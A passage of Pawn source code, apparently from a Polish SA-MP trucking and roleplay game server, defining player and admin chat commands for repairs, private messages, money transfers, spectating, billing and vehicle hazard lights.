					if(PlayerInfo[playerid][VIP] == 0)
					{
						SendClientMessage(playerid,Zolty,"Bonus: "BIALYHEX"$180 "ZIELONYHEX"i"BIALYHEX" 4 score");
						GiveMoneyEx(playerid,150);
						GiveScoreEx(playerid,GetScoreEx(playerid)+4);
						Earned(playerid,180,"Uleczenie gracza, bez vip");
					}

					if(PlayerInfo[playerid][VIP] == 1)
					{
						SendClientMessage(playerid,Zolty,"Bonus: "BIALYHEX"$400 "ZIELONYHEX"i"BIALYHEX" 6 score");
						GiveMoneyEx(playerid,400);
						GiveScoreEx(playerid,GetScoreEx(playerid)+6);
						Earned(playerid,400,"Uleczenie gracza, vip");
					}
					
				}

			}
			else
			{
				SendClientMessage(playerid,Zielony,"Uleczyles Gracza!");
				SendClientMessage(id,Zolty,"Zostales uleczony przez lekarza");
			}
			SetPlayerHealth(id,100);
			SetPlayerDrunkLevel(playerid, 0);

		}
		else
		{
			SendClientMessage(playerid,Zielony,"Uleczyles samego siebie!");
			SetPlayerHealth(id,100);
			SetPlayerDrunkLevel(playerid, 0);
		}

		return 1;
	}



	forward UnLockBonus(playerid);
	public UnLockBonus(playerid)
	{
		SetPVarInt(playerid, "Bonusik", 0);
		return 1;
	}

	CMD:napraw(playerid,params[])
	{
		if(PlayerInfo[playerid][Team] != 2 && PlayerInfo[playerid][LevelAdmin] <= 3)
			return BrakTeam(playerid,2);

		new id;
		if(sscanf(params,"d",id))
			return SendClientMessage(playerid,Zielony,"# Uzyj: "BIALYHEX"/napraw [id]");

		if(!IsPlayerConnected(id))
			return SendClientMessage(playerid,Zielony,"# Ten gracz nie jest podlaczony z serverem!");

		new vehid = GetPlayerVehicleID(id);
		//new mechanikveh = GetPlayerVehicleID(playerid);

		new Float:xp,Float:yp,Float:zp;
		GetPlayerPos(id,xp,yp,zp);
		if(!IsPlayerInRangeOfPoint(playerid,30.0,xp,yp,zp))
			return SendClientMessage(playerid,Zielony,"# Ten gracz nie jest w poblizu ciebie!");

		if(id != playerid)
		{

			if(vehid != 0)
			{
				new Float:health;
				GetVehicleHealth(vehid,health);
				if(health <= 980)
				{
					if(BonusCargo == true)
					{
					SendClientMessage(playerid,Zielony,"# HappyWorld bonus: "BIALYHEX"$"HW_MONEY_TEXT" "ZIELONYHEX"i"BIALYHEX" "HW_SCORE_TEXT" score");
					GiveMoneyEx(playerid,HW_MONEY);
					GiveScoreEx(playerid,GetScoreEx(playerid)+HW_SCORE);
					Earned(playerid,HW_MONEY,"HW Bonus napraw");
					}

					SendClientMessage(playerid,Zielony,"Naprawiles woz!");
					if(PlayerInfo[playerid][VIP] == 1)
					{
						SendClientMessage(playerid,Zolty,"Bonus: "BIALYHEX"$800 "ZIELONYHEX"i"BIALYHEX" 10 score");
						GiveMoneyEx(playerid,600);
						GiveScoreEx(playerid,GetScoreEx(playerid)+7);
						Earned(playerid,600,"Naprawienie wozu, bez vip");
					}
					if(PlayerInfo[playerid][VIP] == 0)
					{
						SendClientMessage(playerid,Zolty,"Bonus: "BIALYHEX"$400 "ZIELONYHEX"i"BIALYHEX" 6 score");
						GiveMoneyEx(playerid,400);
						GiveScoreEx(playerid,GetScoreEx(playerid)+6);
						Earned(playerid,400,"Naprawienie wozu, vip");
					}
				}
				else
				{
					SendClientMessage(playerid,Zielony,"Naprawiles woz!");
				}
				SetVehicleHealth(vehid,1000);
				RepairVehicle(vehid);

			}
			else
				SendClientMessage(playerid,Czerwony,"Gracz nie jest w wozie!");

		}
		else
		{

			if(vehid != 0)
			{
				SendClientMessage(playerid,Zolty,"Naprawiles woz!");
				SetVehicleHealth(vehid,1000);
				RepairVehicle(vehid);
				new rand = random(30);

				if(rand == 2)
				{
					SendClientMessage(playerid,Zielony,"Bonus: "BIALYHEX"$300 "ZIELONYHEX"i"BIALYHEX" 3 score");
					GiveMoneyEx(playerid,300);
					GiveScoreEx(playerid,GetScoreEx(playerid)+3);
					Earned(playerid,150,"Naprawienie siebie");
				

				}

			}
			else
				SendClientMessage(playerid,Czerwony,"Nie jestes w wozie!");

		}


		return 1;


	}
	CMD:odholuj(playerid,params[])
	{
		if(PlayerInfo[playerid][Team] != 2 && PlayerInfo[playerid][LevelAdmin] <= 3)
			return BrakTeam(playerid,2);

		new id;
		if(sscanf(params, "d", id)) return SendClientMessage(playerid, -1, "Uzyj: /resp [id]");
		if(!SetVehicleToRespawn(id)) SendClientMessage(playerid, Czerwony, "Niepoprawne ID");
		else SendClientMessage(playerid, Szary, "Pojazd zostal zrespawnowany");
		return 1;
	}

	CMD:change(playerid,params[])
	{
		if(PlayerInfo[playerid][LevelAdmin] <= 2)
			return BrakAdmina(playerid,3);

		new team;
		if(sscanf(params,"d",team))
			return SendClientMessage(playerid,Zielony,"# Uzyj: "BIALYHEX"/change [team]");

		if(team < 0)
			return SendClientMessage(playerid,Zielony,"# Niepoprawny team id!");

		new query[200];
		new color;
		format(query,sizeof query,"SELECT `color` FROM `company` WHERE `id` = '%d'",team);
		mysql_query(query);
		mysql_store_result();
		mysql_fetch_row(query,"|");
		sscanf(query,"p<|>x",color);
		mysql_free_result();
		new str[10];
		format(str,10,"0x%xFF",color);

		SetPlayerColor(playerid,color);
		AddLog(PlayerName(playerid),"Uzywa cmd /change");
		PlayerInfo[playerid][Team] = team;

		return 1;
	}
	CMD:cargos_reload(playerid,params[])
	{

		if(PlayerInfo[playerid][LevelAdmin] <= 2)
			return BrakAdmina(playerid,3);

		SendClientMessageToAll(Czerwony,"# Wszystkie towary zostaly "BIALYHEX"przeladowane"ZIELONYHEX"!");
		CargoLoaded = 0;
		CargoLoad();
		AddLog(PlayerName(playerid),"Przeladowal wszystkie towary!");

		return 1;

	}
	CMD:me(playerid,params[])
	{
		new textp[150];
		if(sscanf(params,"s[150]",textp))
			return SendClientMessage(playerid, Niebieski,"# Uzyj: "BIALYHEX"/me [text]");

		new string[150];
		format(string,sizeof string,"# %s[ME:%d] - %s",PlayerName(playerid),playerid,textp);
		SendClientMessageDistanse(playerid,Zielony,string);

		return 1;
	}
	CMD:odczep(playerid,params[])
	{
		new trailerido = GetPlayerVehicleID(playerid);
		new odczepa = GetVehicleTrailer(trailerido);

		AttachTrailerToVehicle(trailerido, odczepa);
		DetachTrailerFromVehicle(trailerido);

		return 1;
	}
	CMD:dokumenty(playerid,params[])
	{
		new idtrailer = GetTrailerDLL(playerid);
		new vehid = GetPlayerVehicleID(playerid);

		if(vehid != 0)
		{
			if(VehicleInfo[idtrailer][Towar] >= 1)
			{
				new legal = cInfo[VehicleInfo[idtrailer][Towar]][legalt];
				new nolegal = cInfo[VehicleInfo[idtrailer][Towar]][nolegalt];
				new status[50];

				if(legal == 1)
				{
					status = "Legalny";
				}
				else if(nolegal == 1)
				{
					status = "Nielegalny";
				}

				new string[150];
				new rannorder = VehicleInfo[idtrailer][ToOrder];
				format(string,sizeof string,""NIEBIESKIHEX"Gracz %s pokazuje dokumenty na: "BIALYHEX"%s [%s] Cel: %s",PlayerName(playerid),cInfo[VehicleInfo[idtrailer][Towar]][namet],status,MagazineInfo[rannorder][Name]);
				SendClientMessageDistanse(playerid,Niebieski,string);

			}
			else
			{
				SendClientMessage(playerid,Zielony,"# Ta naczepa/pojazd nie posiada towaru!");
			}
		}
		else
		{
			SendClientMessage(playerid,Zielony,"# Nie jestes w wozie!");
		}

		new string[150];
		format(string,sizeof string," >>> Papiery %s <<< ", PlayerName(playerid));
		SendClientMessageDistanse(playerid,Niebieski,string);
		if(PlayerInfo[playerid][PrawkoA] == false) SendClientMessageDistanse(playerid,Zielony,"# Prawo jazdy kat. A || "CZERWONYHEX"Nieaktualne/Wygasle");
		else SendClientMessageDistanse(playerid,Zielony,"# Prawo jazdy kat. A || "BIALYHEX"Aktualne");

		if(PlayerInfo[playerid][PrawkoB] == false) SendClientMessageDistanse(playerid,Zielony,"# Prawo jazdy kat. B || "CZERWONYHEX"Nieaktualne/Wygasle");
		else SendClientMessageDistanse(playerid,Zielony,"# Prawo jazdy kat. B || "BIALYHEX"Aktualne");

		if(PlayerInfo[playerid][PrawkoC] == false) SendClientMessageDistanse(playerid,Zielony,"# Prawo jazdy kat. C || "CZERWONYHEX"Nieaktualne/Wygasle");
		else SendClientMessageDistanse(playerid,Zielony,"# Prawo jazdy kat. C || "BIALYHEX"Aktualne");

		if(PlayerInfo[playerid][PrawkoD] == false) SendClientMessageDistanse(playerid,Zielony,"# Prawo jazdy kat. D || "CZERWONYHEX"Nieaktualne/Wygasle");
		else SendClientMessageDistanse(playerid,Zielony,"# Prawo jazdy kat. D || "BIALYHEX"Aktualne");

		return 1;
	}
	CMD:licpilot(playerid,params[])
	{
		new string[150];
		format(string,sizeof string," >>> Papiery %s <<< ", PlayerName(playerid));
		SendClientMessageDistanse(playerid,Niebieski,string);
		if(PlayerInfo[playerid][licencjapilota] == false) SendClientMessageDistanse(playerid,Zielony,"# Licencja pilota || "CZERWONYHEX"Nieaktualne/Wygasle");
		else SendClientMessageDistanse(playerid,Zielony,"# Licencja pilota || "BIALYHEX"Aktualne");

		return 1;
	}

	CMD:radio(playerid,params[])
	{
		ShowPlayerDialog(playerid, Radio, DIALOG_STYLE_LIST, ""ZIELONYHEX"Radio", ""CZERWONYHEX"Eska\nRadio Zet\nRMF FM\nRadio Party\nRMF Maxxx", "Wybierz", "Anuluj");
		/*
		SendClientMessage(playerid,Zielony,"# Wlaczyles radio: "BIALYHEX"MusicBox!");
		PlayAudioStreamForPlayer(playerid, "http://listen.slotex.pl/7598.pls");
		*/
		return 1;
	}
	CMD:radiooff(playerid,params[])
	{
		StopAudioStreamForPlayer(playerid);
		return 1;
	}
	CMD:pm(playerid,params[])
	{
		new id,tresc[150];
		if(sscanf(params,"ds[150]",id,tresc))
			return SendClientMessage(playerid,Zielony,"# Uzyj: "BIALYHEX"/pm [id] [tekst]");

		if(!IsPlayerConnected(id))
			return SendClientMessage(playerid,Czerwony,"Ten gracz nie jest polaczony z serverem!");

		new string[150];
		if(GetPVarInt(id, "PRV") == 0)
		{
			format(string,sizeof string,"# PM od %s(%d): "BIALYHEX"%s",PlayerName(playerid),playerid,tresc);
			SendClientMessage(id,Zielony,string);
			format(string,sizeof string,"# Wiadomosc wyslana do %s(%d)",PlayerName(id),id);
			SendClientMessage(playerid,Zielony,string);
			printf("[PM LOG] %s do %s: %s",PlayerName(playerid),PlayerName(id),tresc);
			format(string,sizeof string,"[PM] %s do %s - %s",PlayerName(playerid),PlayerName(id),tresc);
			AddLog(PlayerName(playerid),string);


			if(GetPVarInt(id,"userinfo") != 1)
			{
				TextDrawShowForPlayer(id, pasekuserinfo[id]);
				SetPVarInt(id,"fazainfo",0);
				timerPasekInfo[id] = SetTimerEx("SendPasekInfo",500,true,"id",id,2);
				SetTimerEx("InfoOff",10*1000,false,"d",id);
				SetPVarInt(id,"userinfo",1);
			}

			return 1;
		}
		else
		{
			SendClientMessage(playerid, Zolty, "# Gracz nie chce otrzymywac prywatnych widomosci.");
		}
		return 1;
	}

	CMD:prv(playerid, params[])
	{
		if(GetPVarInt(playerid, "PRV") == 0)
		{
			SetPVarInt(playerid, "PRV", 1);
			SendClientMessage(playerid, JasnyZielony, "# Prywatne wiadomosci: {FFFFFF}Wylaczone");
		}
		else
		{
			SetPVarInt(playerid, "PRV", 0);
			SendClientMessage(playerid, JasnyZielony, "# Prywatne wiadomosci: {FFFFFF}Wlaczone");
		}
		return 1;
	}

	CMD:vip(playerid, params[])
	{
		if(FreeVIP == false)
			return 0;

		PlayerInfo[playerid][VIP] = 1;
		SendClientMessage(playerid, Niebieski, "Otrzymales darmowego vip!");

		return 1;
	}

	CMD:przelew(playerid,params[])
	{
		new id,kwota;
		if(sscanf(params,"dd",id,kwota))
			return SendClientMessage(playerid,Czerwony,"Uzyj: "BIALYHEX"/przelew [id] [kwota]");

		if(!IsPlayerConnected(id))
			return SendClientMessage(playerid,Czerwony,"Gracz nie jest podlaczony z serverem!");

		if(GetMoneyEx(playerid) < kwota)
			return SendClientMessage(playerid,Czerwony,"Nie posiadasz odpowiedniej gotowki!");

		new Float:xid,Float:yid,Float:zid;
		GetPlayerPos(playerid,xid,yid,zid);
		if(!IsPlayerInRangeOfPoint(id,10.0,xid,yid,zid))
			return SendClientMessage(playerid,Czerwony,"Gracz musi byc w zasiegu maksymalnym "BIALYHEX"10 m"ZIELONYHEX" od ciebie!");

		if(kwota <= 0)
			return SendClientMessage(playerid,Zielony,"# Nie oszukasz systemu!");

		if(GiveMoneyEx(playerid,-kwota))
			GiveMoneyEx(id,kwota);
		new string[100];
		format(string,sizeof string,"Przelales %s: "BIALYHEX"$%d",PlayerName(id),kwota);
		SendClientMessage(playerid,Zielony,string);
		format(string,sizeof string,"Dostales od %s "BIALYHEX"$%d",PlayerName(playerid),kwota);
		SendClientMessage(id,Zielony,string);


		return 1;
	}

	CMD:respawn(playerid,params[])
	{
		if(PlayerInfo[playerid][LevelAdmin] <= 0)
			return BrakAdmina(playerid,2);

		SendClientMessageToAll(Zielony,"# Respawn nieuzywanych pojazdow za "BIALYHEX"30 sekund"ZIELONYHEX"!");
		SetTimer("respawn",30*1000,false);

		return 1;
	}
	CMD:a(playerid, params[])
	{
		if(PlayerInfo[playerid][LevelAdmin] <= 1)
			return BrakAdmina(playerid,2);
		new atext[256], string[256];
		if(sscanf(params, "s", atext))
			return SendClientMessage(playerid, JasnyCzerwony, "/a [text]");
		format(string, sizeof(string), "~w~%s", atext);
		GameTextForAll(string, 10000, 4);
		return 1;
	}

	CMD:m(playerid, params[])
	{
		if(PlayerInfo[playerid][LevelAdmin] <= 0)
			return BrakAdmina(playerid,2);
		new mtext[256], string[256];
		if(sscanf(params, "s[256]", mtext))
			return SendClientMessage(playerid, JasnyCzerwony, "/m [text]");
		format(string, sizeof(string), " > %s", mtext);
		SendClientMessageToAll(JasnyZielony, string);
		return 1;
	}
	CMD:awaryjne(playerid, params[])
	{
		new vehicleid = GetPlayerVehicleID(playerid);
		new kid = GetVehicleModel(vehicleid);
		if(GetPVarInt(playerid, "awaryjn") == 0)
		{
			if(kid == 515)
			{
				if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
				{
					SendClientMessage(playerid, Zielony, "# Swiatla awaryjne zostaly wlaczone!");
					LewyMigacz1[vehicleid] = CreateObject(19294, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 250.0);//19294
					AttachObjectToVehicle(LewyMigacz1[vehicleid], vehicleid, -1.3, 4.3, -0.33, -1.3, -2.499999, -0.2);
					LewyMigacz2[vehicleid] = CreateObject(19294, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 250.0);
					AttachObjectToVehicle(LewyMigacz2[vehicleid], vehicleid, -1.3, -5.0, -1.15, -1.3, -2.499999, -0.2);
					//Prawy
					PrawyMigacz1[vehicleid] = CreateObject(19294, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 250.0);
					AttachObjectToVehicle(PrawyMigacz1[vehicleid], vehicleid, 1.3, 4.3, -0.33, 1.3, -2.499999, -0.2);
					PrawyMigacz2[vehicleid] = CreateObject(19294, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 250.0);
					AttachObjectToVehicle(PrawyMigacz2[vehicleid], vehicleid, 1.3, -5.0, -1.15, 1.3, -2.499999, -0.2);
					SetPVarInt(playerid, "awaryjn", 1);
					if(GetVehicleTrailer(vehicleid))
					{
						// *Export using dialog*:
						NaczepaMigacz1[vehicleid] = CreateObject(19294,0,0,-1000,0,0,0,100);
						AttachObjectToVehicle(NaczepaMigacz1[vehicleid], GetVehicleIDTrailer(playerid,vehicleid,GetVehicleTrailer(vehicleid)), -1.049999,-4.125001,-0.750000,0.000000,0.000000,0.000000);

						// *Export using dialog*:
						NaczepaMigacz2[vehicleid] = CreateObject(19294,0,0,-1000,0,0,0,100);
						AttachObjectToVehicle(NaczepaMigacz2[vehicleid], GetVehicleIDTrailer(playerid,vehicleid,GetVehicleTrailer(vehicleid)), 1.049999,-4.125001,-0.750000,0.000000,0.000000,0.000000);

					}
				}
			}
			if(kid == 514)
			{
				if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
				{
					SendClientMessage(playerid, Zielony, "# Swiatla awaryjne zostaly wlaczone!");
					LewyMigacz1[vehicleid] = CreateObject(19294, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 250.0);
					AttachObjectToVehicle(LewyMigacz1[vehicleid], vehicleid, -1.24, 4.3, 0.1, -1.3, -2.499999, -0.2);
					LewyMigacz2[vehicleid] = CreateObject(19294, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 250.0);
					AttachObjectToVehicle(LewyMigacz2[vehicleid], vehicleid, -0.38, -4.99, -0.52, -1.3, -2.499999, -0.2);
					//Prawy
					PrawyMigacz1[vehicleid] = CreateObject(19294, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 250.0);
					AttachObjectToVehicle(PrawyMigacz1[vehicleid], vehicleid, 1.24, 4.3, 0.1, 1.3, -2.499999, -0.2);
					PrawyMigacz2[vehicleid] = CreateObject(19294, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 250.0);
					AttachObjectToVehicle(PrawyMigacz2[vehicleid], vehicleid, 0.38, -4.99, -0.52, 1.3, -2.499999, -0.2);
					SetPVarInt(playerid, "awaryjn", 1);

					if(GetVehicleTrailer(vehicleid))
					{
						// LEWY
						NaczepaMigacz1[vehicleid] = CreateObject(19294,0,0,-1000,0,0,0,100);
						AttachObjectToVehicle(NaczepaMigacz1[vehicleid], GetVehicleIDTrailer(playerid,vehicleid,GetVehicleTrailer(vehicleid)), -1.049999,-4.125001,-0.750000,0.000000,0.000000,0.000000);

						// PRAWY
						NaczepaMigacz2[vehicleid] = CreateObject(19294,0,0,-1000,0,0,0,100);
						AttachObjectToVehicle(NaczepaMigacz2[vehicleid], GetVehicleIDTrailer(playerid,vehicleid,GetVehicleTrailer(vehicleid)), 1.049999,-4.125001,-0.750000,0.000000,0.000000,0.000000);

					}
				}
			}
		}
		else
		{
			if(kid == 515)
			{
				if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
				{
					SetPVarInt(playerid, "awaryjn", 0);
					SendClientMessage(playerid, Zielony, "# Swiatla awaryjne zostaly wylaczone!");
					DestroyObject(LewyMigacz1[vehicleid]);
					DestroyObject(LewyMigacz2[vehicleid]);
					DestroyObject(PrawyMigacz1[vehicleid]);
					DestroyObject(PrawyMigacz2[vehicleid]);
					DestroyObject(NaczepaMigacz1[vehicleid]);
					DestroyObject(NaczepaMigacz2[vehicleid]);
				}
			}
			if(kid == 514)
			{
				if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
				{
					SetPVarInt(playerid, "awaryjn", 0);
					SendClientMessage(playerid, Zielony, "# Swiatla awaryjne zostaly wylaczone!");
					DestroyObject(LewyMigacz1[vehicleid]);
					DestroyObject(LewyMigacz2[vehicleid]);
					DestroyObject(PrawyMigacz1[vehicleid]);
					DestroyObject(PrawyMigacz2[vehicleid]);
					DestroyObject(NaczepaMigacz1[vehicleid]);
					DestroyObject(NaczepaMigacz2[vehicleid]);
				}
			}
		}
		return 1;
	}

	CMD:apomoc(playerid,params[])
	{
		if(PlayerInfo[playerid][LevelAdmin] <= 0)
			return BrakAdmina(playerid,1);

		if(PlayerInfo[playerid][LevelAdmin] >= 1)
		{
			SendClientMessage(playerid,Zielony,"----------- Admin Command's ------------");
			SendClientMessage(playerid,JasnyCzerwony,CMDADMIN1);
		}
		if(PlayerInfo[playerid][LevelAdmin] >= 2)
		{
			SendClientMessage(playerid,JasnyCzerwony,CMDADMIN2);
		}
		if(PlayerInfo[playerid][LevelAdmin] >= 3)
		{
			SendClientMessage(playerid,JasnyCzerwony,CMDADMIN3);
		}
		if(PlayerInfo[playerid][LevelAdmin] >= 4)
		{
			SendClientMessage(playerid,JasnyCzerwony,CMDADMIN4);
		}
		if(PlayerInfo[playerid][LevelAdmin] >= 5)
		{
			SendClientMessage(playerid,JasnyCzerwony,CMDADMIN5);
		}

		return 1;
	}
	CMD:menu(playerid,params[])
	{
		ShowPlayerDialog(playerid, Menu, DIALOG_STYLE_LIST, ""ZIELONYHEX"Menu Gracza", "Telefon\nStatystyki\nOpcje Pojazdu\nEventy Graczy", "Wybierz", "Anuluj");
		return 1;
	}
	CMD:eyecmd(playerid,params[])
	{
		if(PlayerInfo[playerid][LevelAdmin] <= 3)
			return BrakAdmina(playerid,4);

		if(GetPVarInt(playerid,"eyecmd") == 1)
		{
			SendClientMessage(playerid,Zielony,"# Eye cmd zostal: "BIALYHEX"Wylaczony!");
			SetPVarInt(playerid,"eyecmd",0);
		}
		else
		{
			SetPVarInt(playerid,"eyecmd",1);
			SendClientMessage(playerid,Zielony,"# Eye cmd zostal: "BIALYHEX"Wlaczony!");
		}

		return 1;
	}
	CMD:spec(playerid,params[])
	{
		if(PlayerInfo[playerid][LevelAdmin] <= 0)
			return BrakAdmina(playerid,1);

		new id;
		if(sscanf(params,"d",id))
			return SendClientMessage(playerid,Zielony,"# Uzyj: "BIALYHEX"/spec [id]");

		if(!IsPlayerConnected(id))
			return SendClientMessage(playerid,Zielony,"# Gracz nie jest podlaczony z serverem!");

		new specplayerid = id;

		TogglePlayerSpectating(playerid, 1);
		PlayerSpectatePlayer(playerid, specplayerid);
		SetPlayerInterior(playerid,GetPlayerInterior(specplayerid));

		if(GetPlayerVehicleID(specplayerid) != 0)
		{
			gSpectateType[playerid] = ADMIN_SPEC_TYPE_VEHICLE;
			PlayerSpectateVehicle(playerid, GetPlayerVehicleID(specplayerid));
			gSpectateID[playerid] = specplayerid;
			gSpectator[specplayerid] = playerid;
		}
		else // Copyright (c) 2014-2015 KapiziaK 
		{
		gSpectateID[playerid] = specplayerid;
		gSpectator[specplayerid] = playerid;
		gSpectateType[playerid] = ADMIN_SPEC_TYPE_PLAYER;
		}

		return 1;
	}

	CMD:specveh(playerid,params[])
	{
		if(PlayerInfo[playerid][LevelAdmin] <= 0)
			return BrakAdmina(playerid,1);

		new id;
		if(sscanf(params,"d",id))
			return SendClientMessage(playerid,Zielony,"# Uzyj: "BIALYHEX"/spec [vehid]");

		new specveh = id;

		TogglePlayerSpectating(playerid, 1);
		PlayerSpectateVehicle(playerid, specveh);


		//gSpectateID[playerid] = specplayerid;
		//gSpectator[specplayerid] = playerid;
		gSpectateType[playerid] = ADMIN_SPEC_TYPE_VEHICLE;
		

		return 1;
	}

	CMD:specoff(playerid,params[])
	{
		if(PlayerInfo[playerid][LevelAdmin] <= 0)
			return BrakAdmina(playerid,1);

		TogglePlayerSpectating(playerid, 0);
		gSpectator[gSpectateID[playerid]] = INVALID_PLAYER_ID;
		gSpectateID[playerid] = INVALID_PLAYER_ID;

		gSpectateType[playerid] = ADMIN_SPEC_TYPE_NONE;

		return 1;
	}
	CMD:report(playerid,params[])
	{
		new id,report[50];
		if(sscanf(params,"ds[50]",id,report))
			return SendClientMessage(playerid,Zielony,"# Uzyj: "BIALYHEX"/report [id] [tresc]");

		if(!IsPlayerConnected(id))
			return SendClientMessage(playerid,Zielony,"# Gracz nie jest podlaczony z serverem!");

		for(new i=0; i < GetMaxPlayers(); i++)
		{
			if(IsPlayerConnected(i) && PlayerInfo[i][LevelAdmin] >= 1)
			{
				new string[200];
				format(string,sizeof string,"# Report na %s(%d) od %s(%d): %s",PlayerName(id),id,PlayerName(playerid),playerid,report);
				SendClientMessage(i,Czerwony,string);
			}
		}

		return 1;
	}
	CMD:flip(playerid,params[])
	{
		new vehid = GetPlayerVehicleID(playerid);
		if(vehid != 0)
		{
			new Float: Xr, Float: Yr, Float: Zr;
			new vehicleid = GetPlayerVehicleID(playerid);
			GetPlayerPos(playerid, Xr, Yr, Zr);
			SetVehiclePos(vehicleid, Xr, Yr, Zr+2);
			SetVehicleZAngle(vehicleid, 0);
			SendClientMessage(playerid, Zielony, "# Twoj pojazd zostal przywrocony do ruchu!");
		}
		else
		{
			SendClientMessage(playerid,Zielony,"# Nie jestes w wozie!");
		}
		return 1;
	}
	CMD:give_money(playerid,params[])
	{
		if(PlayerInfo[playerid][LevelAdmin] <= 4)
			return BrakAdmina(playerid,5);

		new id,hajs;
		if(sscanf(params,"dd",id,hajs))
			return SendClientMessage(playerid,Zielony,"# Uzyj: "BIALYHEX"/give_money [id] [pieniadze]");

		if(!IsPlayerConnected(id))
			return SendClientMessage(playerid,Zielony,"# Gracz nie jest podlaczony z serverem!");

		GiveMoneyEx(id,hajs);
		new string[100];
		format(string,sizeof string,"# Dales dla %s: "BIALYHEX"$%d",PlayerName(id),hajs);
		SendClientMessage(playerid,Zielony,string);
		format(string,sizeof string,"# Dostales od administratora "BIALYHEX"$%d",hajs);
		SendClientMessage(id,Zielony,string);


		return 1;
	}
	CMD:give_score(playerid,params[])
	{
		if(PlayerInfo[playerid][LevelAdmin] <= 4)
			return BrakAdmina(playerid,5);

		new id,hajs;
		if(sscanf(params,"dd",id,hajs))
			return SendClientMessage(playerid,Zielony,"# Uzyj: "BIALYHEX"/give_score [id] [ilosc]");

		if(!IsPlayerConnected(id))
			return SendClientMessage(playerid,Zielony,"# Gracz nie jest podlaczony z serverem!");

		GiveScoreEx(id,GetScoreEx(id)+hajs);
		new string[100];
		format(string,sizeof string,"# Dales dla %s: "BIALYHEX"%d pkt.",PlayerName(id),hajs);
		SendClientMessage(playerid,Zielony,string);
		format(string,sizeof string,"# Dostales od administratora "BIALYHEX"%d pkt.",hajs);
		SendClientMessage(id,Zielony,string);


		return 1;
	}

	CMD:gps(playerid,params[])
	{
		new id;
		if(sscanf(params,"d",id))
			return SendClientMessage(playerid,Zielony,"# Uzyj: "BIALYHEX"/gps [id]");

		if(!IsPlayerConnected(id))
			return SendClientMessage(playerid,Zielony,"# Gracz nie jest podlaczony z serverem!");

		new Float:xg,Float:yg,Float:zg;
		GetPlayerPos(id,xg,yg,zg);
		SetPlayerMapIcon(playerid, 71, xg,yg,zg, 60, 0, MAPICON_GLOBAL );

		return 1;
	}
	CMD:gpsoff(playerid,params[])
	{
		RemovePlayerMapIcon( playerid, 71 );

		return 1;
	}
	CMD:cb(playerid,params[])
	{
		if(PlayerInfo[playerid][Team] >= 1 && PlayerInfo[playerid][Team] <= 4)
			return SendClientMessage(playerid,Zielony,"# CB Jest tylko dla mobilkow!");

		new tresc[150];
		if(sscanf(params,"s[150]",tresc))
			return SendClientMessage(playerid,Szary,"Uzyj: "BIALYHEX"/cb [tresc]");

		new string[150];
		format(string,sizeof string,"[CB] %s: %s",PlayerName(playerid),tresc);

		for(new i=0; i < GetMaxPlayers(); i++)
		{

			if(IsPlayerConnected(i) && PlayerInfo[i][Team] != COMPANY_POLICJA)

				SendClientMessage(i,JasnyNiebieski,string);
			}



		return 1;
	}
	CMD:tankujall(playerid,params[])
	{
		if(PlayerInfo[playerid][LevelAdmin] <= 3)
			return BrakAdmina(playerid,4);

		for(new i=0; i <= LoadedInfo[Vehicles]; i++)
		{
			VehicleInfo[i][Paliwo] = 350;
		}

		SendClientMessageToAll(Zielony,"# Wszystkie wozy zostaly zatankowane!");

		return 1;
	}
	CMD:tankowanie(playerid,params[])
	{
		if(PlayerInfo[playerid][Team] != 2)
			return BrakTeam(playerid,2);

		new vehid = GetPlayerVehicleID(playerid);
		if(vehid != 0)
		{

			if(VehicleInfo[vehid][Paliwo] <= 300)
			{
				SendClientMessage(playerid,Zielony,"# Bonus za zatankowanie wozu: "BIALYHEX"$300 "ZIELONYHEX"i"BIALYHEX" 3 pkt");
				GiveMoneyEx(playerid,300);
				GiveScoreEx(playerid,GetScoreEx(playerid)+3);
				Earned(playerid,300,"Tankowanie - bonus");
			}
			else
			{
				SendClientMessage(playerid,Zielony,"# Zatankowales do wozu 100 l. paliwa pokrywasz koszty: "BIALYHEX"$400");
				GiveMoneyEx(playerid,-400);
				Earned(playerid,200,"Tankowanie - bez bonusu");
			}
			VehicleInfo[vehid][Paliwo] = VehicleInfo[vehid][Paliwo]+100;

		}

		return 1;
	}
	CMD:rachunek(playerid,params[])
	{
		if(PlayerInfo[playerid][Team] != COMPANY_PD && PlayerInfo[playerid][Team] != COMPANY_LINIA)
		{
			BrakTeam(playerid,2);
			return BrakTeam(playerid,COMPANY_LINIA);
		}

		new id,hajs;
		if(sscanf(params,"dd",id,hajs))
			return SendClientMessage(playerid,Zielony,"# Uzyj: "BIALYHEX"/rachunek [id] [ilosc]");

		if(!IsPlayerConnected(id))
			return SendClientMessage(playerid,Zielony,"# Gracz nie jest podlaczony z serverem!");

		if(hajs >= 10000 || hajs <= 100)
			return SendClientMessage(playerid,Zielony,"# Nieprawidlowa kwota!");

		new Float:xx,Float:yy,Float:zz;
		GetPlayerPos(id,xx,yy,zz);

		if(!IsPlayerInRangeOfPoint(playerid,10.0,xx,yy,zz))
			return SendClientMessage(playerid,Zielony,"# Musisz byc blisko gracza!");

		if(GetMoneyEx(id) < hajs)
			return SendClientMessage(playerid,Zielony,"# Gracz nie ma tyle pieniedzy!");

		new string[150];
		format(string,sizeof string,"# Dales dla %s rachunek w wysokosci: "BIALYHEX"$%d"ZIELONYHEX" || Wynagrodzenie: "BIALYHEX"$%d",PlayerName(id),hajs,hajs/2);
		SendClientMessage(playerid,Zielony,string);
		GiveMoneyEx(playerid,hajs/2);
		format(string,sizeof string,"# Dostales od %s rachunek w wysokosci: "BIALYHEX"$%d",PlayerName(playerid),hajs);
		SendClientMessage(id,Zielony,string);
		GiveMoneyEx(id,-hajs);

		format(logstring,sizeof logstring,"Wystawil rachunek dla %s na kwote $%d",PlayerName(playerid),hajs);
		AddLog(PlayerName(playerid),logstring);

		Earned(playerid,hajs/2,"Wystawienie rachunku");

		return 1;
	}
	CMD:skuj(playerid,params[])
	{
		if(PlayerInfo[playerid][Team] != COMPANY_POLICJA)
